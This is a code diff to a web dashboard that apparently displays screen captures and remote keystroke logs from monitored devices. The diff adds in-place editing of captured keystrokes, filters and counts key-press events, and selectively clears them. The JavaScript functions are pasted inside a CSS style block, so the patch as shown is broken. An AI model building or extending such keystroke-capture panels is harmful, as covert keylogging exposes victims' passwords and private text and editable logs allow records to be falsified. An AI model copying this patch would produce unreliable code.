@@ -9,6 +9,66 @@
         color-scheme: dark;
         font-family: Inter, Arial, sans-serif;
       }
+
+      function startEdit(index) {
+        const tr = logBody.querySelector(`tr[data-evt-index="${index}"]`);
+        if (!tr) return;
+        const evt = currentKeyboardEvents[index] || { time: '', type: '', key: '' };
+
+        tr.innerHTML = `
+          <td><input class="edit-time" type="text" value="${escapeHtml(evt.time || '')}" style="width:160px" /></td>
+          <td><input class="edit-type" type="text" value="${escapeHtml(evt.type || '')}" style="width:100px" /></td>
+          <td><input class="edit-key" type="text" value="${escapeHtml(evt.key || '')}" style="width:140px" /></td>
+          <td>
+            <button type="button" class="icon-button" data-action="save" data-index="${index}">💾</button>
+            <button type="button" class="icon-button" data-action="cancel" data-index="${index}">✖</button>
+          </td>
+        `;
+
+        const saveBtn = tr.querySelector('button[data-action="save"]');
+        const cancelBtn = tr.querySelector('button[data-action="cancel"]');
+        saveBtn.addEventListener('click', () => saveEdit(index));
+        cancelBtn.addEventListener('click', () => cancelEdit(index));
+      }
+
+      function saveEdit(index) {
+        const tr = logBody.querySelector(`tr[data-evt-index="${index}"]`);
+        if (!tr) return;
+        const timeVal = tr.querySelector('.edit-time').value.trim();
+        const typeVal = tr.querySelector('.edit-type').value.trim();
+        const keyVal = tr.querySelector('.edit-key').value.trim();
+
+        // Update filtered array
+        if (!currentKeyboardEvents[index]) currentKeyboardEvents[index] = {};
+        currentKeyboardEvents[index].time = timeVal;
+        currentKeyboardEvents[index].type = typeVal;
+        currentKeyboardEvents[index].key = keyVal;
+
+        // Map back to original device array and update that entry
+        if (lastPayload && Array.isArray(lastPayload.devices)) {
+          const device = lastPayload.devices[selectedDeviceIndex];
+          if (device && Array.isArray(device.keyboard_events)) {
+            const origIndex = currentKeyboardIndices[index];
+            if (origIndex != null && origIndex >= 0 && origIndex < device.keyboard_events.length) {
+              device.keyboard_events[origIndex] = {
+                time: timeVal,
+                type: typeVal,
+                key: keyVal,
+              };
+            }
+          }
+        }
+
+        // Re-render from original device data to maintain correct mapping
+        const selected = getSelectedDevice();
+        renderKeyboardLog(selected ? (selected.keyboard_events || []) : []);
+        updatePreview();
+      }
+
+      function cancelEdit(index) {
+        // simply re-render from current data
+        renderKeyboardLog(currentKeyboardEvents);
+      }
       * {
         box-sizing: border-box;
       }
@@ -459,6 +519,7 @@
       let pollTimer = null;
       let devicesFilter = '';
       let currentKeyboardEvents = [];
+      let currentKeyboardIndices = [];
       const demoDevices = [
         {
           device_id: 'DESKTOP-01',
@@ -572,7 +633,7 @@
         statusDot.classList.remove('offline');
         previewTitle.textContent = formatDeviceTitle(selected);
         previewImage.src = buildImageUrl(selected);
-        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.length : 0;
+        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && String(e.type).toLowerCase() === 'press').length : 0;
         previewMeta.innerHTML = `Screen monitoring · ${selected.source || 'standalone-capture-app'} · ${selected.timestamp || 'Unknown time'} <span class="preview-badge">${eventCount} keyboard event${eventCount === 1 ? '' : 's'}</span>`;
         renderKeyboardLog(selected.keyboard_events || []);
       }
@@ -621,7 +682,7 @@
 
           const eventDetail = document.createElement('div');
           eventDetail.className = 'device-detail';
-          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.length : 0;
+          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && String(e.type).toLowerCase() === 'press').length : 0;
           eventDetail.textContent = `${eventCount} keyboard event${eventCount === 1 ? '' : 's'}`;
 
           const status = document.createElement('div');
@@ -655,23 +716,65 @@
       }
 
       function renderKeyboardLog(events) {
-        currentKeyboardEvents = Array.isArray(events) ? events : [];
+        // events is the original array from the device; we filter to only 'press' events
+        const original = Array.isArray(events) ? events : [];
+        const filtered = [];
+        const indices = [];
+        for (let i = 0; i < original.length; i++) {
+          const ev = original[i];
+          if (!ev || !ev.type) continue;
+          const t = String(ev.type).toLowerCase();
+          if (t === 'press' || t === 'key') {
+            filtered.push(ev);
+            indices.push(i);
+          }
+        }
+
+        currentKeyboardEvents = filtered;
+        currentKeyboardIndices = indices;
+
         if (!currentKeyboardEvents.length) {
           logBody.innerHTML = '<div class="log-empty">No remote keyboard events yet.</div>';
           return;
         }
 
-        const lines = currentKeyboardEvents
+        // Render editable rows (newest first)
+        const rows = currentKeyboardEvents
           .slice()
-          .map((event) => {
-            const when = event?.time ? String(event.time) : 'unknown time';
-            const key = event?.key ? String(event.key) : '<unknown>';
-            const type = event?.type ? String(event.type) : 'event';
-            return `${when} ${type}: ${key}`;
+          .reverse()
+          .map((event, revIndex) => {
+            const fIndex = currentKeyboardEvents.length - 1 - revIndex;
+            const time = escapeHtml(event.time || '');
+            const type = escapeHtml(event.type || '');
+            const key = escapeHtml(event.key || '');
+            return `
+              <tr data-evt-index="${fIndex}">
+                <td class="evt-time">${time}</td>
+                <td class="evt-type">${type}</td>
+                <td class="evt-key">${key}</td>
+                <td>
+                  <button type="button" class="icon-button" data-action="edit" data-index="${fIndex}">✏️</button>
+                </td>
+              </tr>
+            `;
           })
-          .join('\n');
+          .join('');
 
-        logBody.innerHTML = `<textarea readonly class="log-textarea" placeholder="Keyboard events will appear here">${escapeHtml(lines)}</textarea>`;
+        logBody.innerHTML = `
+          <table class="log-table">
+            <thead>
+              <tr><th>Time</th><th>Type</th><th>Key</th><th></th></tr>
+            </thead>
+            <tbody>${rows}</tbody>
+          </table>
+        `;
+
+        // Attach handlers for edit buttons
+        const editButtons = logBody.querySelectorAll('button[data-action="edit"]');
+        editButtons.forEach((btn) => btn.addEventListener('click', (e) => {
+          const idx = parseInt(btn.getAttribute('data-index'), 10);
+          startEdit(idx);
+        }));
       }
 
       function setPausedState(paused) {
@@ -752,14 +855,20 @@
       });
 
       clearLogButton.addEventListener('click', () => {
+        // Remove only key/press events from the selected device's event list
         const selected = getSelectedDevice();
-        if (selected) {
-          selected.keyboard_events = [];
+        if (selected && Array.isArray(selected.keyboard_events)) {
+          const filtered = selected.keyboard_events.filter((ev) => {
+            if (!ev || !ev.type) return true;
+            const t = String(ev.type).toLowerCase();
+            return !(t === 'press' || t === 'key');
+          });
+          selected.keyboard_events = filtered;
           if (lastPayload?.devices) {
             const deviceId = selected.device_id || selected.safe_device_id;
             const matchingDevice = lastPayload.devices.find((item) => (item.device_id || item.safe_device_id) === deviceId);
             if (matchingDevice) {
-              matchingDevice.keyboard_events = [];
+              matchingDevice.keyboard_events = filtered;
             }
           }
         }
